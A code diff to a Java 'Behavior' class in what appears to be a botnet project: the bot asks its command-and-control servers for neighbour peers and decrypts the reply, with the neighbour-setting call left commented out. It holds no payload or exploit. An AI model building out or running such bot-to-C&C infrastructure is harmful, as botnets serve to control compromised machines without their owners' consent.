@@ -1,11 +1,13 @@
 package cs.sii.bot.action;
 
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
 import java.security.SignatureException;
+import java.util.ArrayList;
 import java.util.List;
 
 import javax.crypto.BadPaddingException;
@@ -67,8 +69,15 @@ public class Behavior {
 		String data = nServ.getIdHash();
 
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
-
-		nServ.setNeighbours(request.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data));
+		List<Object> newOb= new ArrayList<Object>();
+		try {
+			newOb.addAll(pki.getCrypto().decodeStrings(request.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data)));
+		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
+				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException | IOException e) {
+			e.printStackTrace();
+		}
+//		nServ.setNeighbours();
+		
 
 	}
 
